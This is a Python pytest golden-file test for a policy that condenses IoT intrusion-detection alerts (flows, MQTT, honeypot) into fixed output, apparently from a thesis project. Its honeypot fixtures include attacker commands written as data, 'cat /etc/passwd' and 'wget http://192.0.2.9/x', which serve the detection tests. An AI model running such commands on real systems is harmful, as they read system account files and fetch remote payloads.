"""Golden-file tests for the frozen reduction policy (E3-07, SCRUM-86).

The golden files in `tests/golden/reduce/` fix the exact reduced output for representative
bundles (record §6.9). Any change to the reduced output — even one character of format — fails
these tests instead of silently shifting experiment results. Updating a golden after the E2-09
freeze is a locked-parameter change: see `tests/golden/reduce/README.md`.

Regenerate the goldens after a *reviewed, changelogged* policy change:

    python -m tests.test_reduce_golden    # rewrites every *.input.json / *.expected.json
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from thesis.assemble.bundles import Bundle
from thesis.reduce.policy import reduce, to_json
from thesis.schema.alert import Alert, FlowDetail, HoneypotDetail, MqttDetail, Source

GOLDEN_DIR = Path(__file__).parent / "golden" / "reduce"
T0 = datetime(2026, 1, 1, tzinfo=UTC)


def _flow(aid: str, score: float, *, ts_off: int, dst_ip: str, dst_port: int) -> Alert:
    return Alert(
        alert_id=aid,
        source="flows",
        ts=T0 + timedelta(seconds=ts_off),
        subject_device="iot-cam-01",
        detector_score=score,
        detector_label="syn_flood",
        detector_name="flow_classifier",
        detail=FlowDetail(
            flow_start=T0 + timedelta(seconds=ts_off),
            duration_s=1.5,
            src_ip="10.77.0.22",
            src_port=40000 + ts_off,
            dst_ip=dst_ip,
            dst_port=dst_port,
            protocol="tcp",
            packets_fwd=12,
            packets_bwd=0,
            bytes_fwd=720,
            bytes_bwd=0,
            syn_count_fwd=12,
            ack_count_fwd=0,
        ),
    )


def _mqtt(aid: str, score: float, *, ts_off: int, topic: str, payload: int) -> Alert:
    return Alert(
        alert_id=aid,
        source="mqtt",
        ts=T0 + timedelta(seconds=ts_off),
        subject_device="iot-cam-01",
        detector_score=score,
        detector_label="novel_topic",
        detector_name="mqtt_thresholds",
        detail=MqttDetail(event="publish", topic=topic, qos=0, payload_bytes=payload),
    )


def _hp(aid: str, event: str, *, ts_off: int, session: str, command: str | None = None) -> Alert:
    return Alert(
        alert_id=aid,
        source="honeypot",
        ts=T0 + timedelta(seconds=ts_off),
        subject_device="iot-cam-01",
        detector_score=0.8,
        detector_label=event,
        detector_name="honeypot_rules",
        detail=HoneypotDetail(
            event=event, session_id=session, src_ip="10.77.0.30", src_port=22, command=command
        ),
    )


def _bundle(alerts: list[Alert], label: str) -> Bundle:
    return Bundle(
        bundle_id=f"iot-cam-01|{T0.isoformat()}",
        device="iot-cam-01",
        window_start=T0,
        window_end=T0 + timedelta(seconds=60),
        label=label,
        episode_id="ep-golden",
        sources=tuple(sorted({a.source.value for a in alerts})),
        alerts=tuple(alerts),
    )


def _all_sources() -> tuple[Bundle, tuple[Source, ...]]:
    alerts = [
        _flow("f1", 0.97, ts_off=2, dst_ip="192.0.2.10", dst_port=80),
        _flow("f2", 0.61, ts_off=5, dst_ip="192.0.2.11", dst_port=443),
        _mqtt("m1", 1.0, ts_off=3, topic="iot/iot-cam-01/flood", payload=4),
        _mqtt("m2", 0.0, ts_off=8, topic="iot/iot-cam-01/telemetry", payload=40),
        _hp("h1", "session_connect", ts_off=1, session="s1"),
        _hp("h2", "command", ts_off=4, session="s1", command="cat /etc/passwd"),
        _hp("h3", "command", ts_off=6, session="s1", command="wget http://192.0.2.9/x"),
    ]
    return _bundle(alerts, "mixed"), tuple(Source)


def _flows_only() -> tuple[Bundle, tuple[Source, ...]]:
    alerts = [
        _flow("f1", 0.9, ts_off=1, dst_ip="192.0.2.10", dst_port=80),
        _flow("f2", 0.4, ts_off=7, dst_ip="192.0.2.10", dst_port=22),
    ]
    return _bundle(alerts, "syn_flood"), (Source.FLOWS,)


def _flows_honeypot() -> tuple[Bundle, tuple[Source, ...]]:
    alerts = [
        _flow("f1", 0.88, ts_off=2, dst_ip="192.0.2.12", dst_port=23),
        _hp("h1", "session_connect", ts_off=1, session="s1"),
        _hp("h2", "login_failed", ts_off=3, session="s1"),
        _hp("h3", "command", ts_off=5, session="s1", command="id"),
    ]
    return _bundle(alerts, "intrusion"), (Source.FLOWS, Source.HONEYPOT)


def _exemplar_cap() -> tuple[Bundle, tuple[Source, ...]]:
    # Eight flow alerts: more than the five-exemplar cap, so three spill into other_ids.
    alerts = [
        _flow(f"f{i}", score=round(0.9 - i * 0.05, 2), ts_off=i, dst_ip="192.0.2.20", dst_port=80)
        for i in range(8)
    ]
    return _bundle(alerts, "syn_flood"), (Source.FLOWS,)


CASES = {
    "all_sources": _all_sources,
    "flows_only": _flows_only,
    "flows_honeypot": _flows_honeypot,
    "exemplar_cap": _exemplar_cap,
}


def _input_path(name: str) -> Path:
    return GOLDEN_DIR / f"{name}.input.json"


def _expected_path(name: str) -> Path:
    return GOLDEN_DIR / f"{name}.expected.json"


def _write_goldens() -> None:
    GOLDEN_DIR.mkdir(parents=True, exist_ok=True)
    for name, build in CASES.items():
        bundle, sources = build()
        payload = {
            "sources": [s.value for s in sources],
            "bundle": json.loads(bundle.model_dump_json()),
        }
        _input_path(name).write_text(
            json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
        _expected_path(name).write_text(
            to_json(reduce(bundle, sources=sources)) + "\n", encoding="utf-8"
        )


def _load_input(name: str) -> tuple[Bundle, tuple[Source, ...]]:
    payload = json.loads(_input_path(name).read_text(encoding="utf-8"))
    bundle = Bundle.model_validate(payload["bundle"])
    sources = tuple(Source(s) for s in payload["sources"])
    return bundle, sources


@pytest.mark.parametrize("name", sorted(CASES))
def test_reduce_matches_golden(name: str) -> None:
    bundle, sources = _load_input(name)
    actual = to_json(reduce(bundle, sources=sources))
    expected = _expected_path(name).read_text(encoding="utf-8").rstrip("\n")
    assert actual == expected, (
        f"golden mismatch for {name!r}; regenerate with "
        f"`python -m tests.test_reduce_golden` only after a changelogged policy change.\n"
        f"expected: {expected}\n  actual: {actual}"
    )


def test_all_four_source_mixes_present() -> None:
    assert set(CASES) == {"all_sources", "flows_only", "flows_honeypot", "exemplar_cap"}


if __name__ == "__main__":
    _write_goldens()
    print(f"wrote {len(CASES)} golden pairs to {GOLDEN_DIR}")
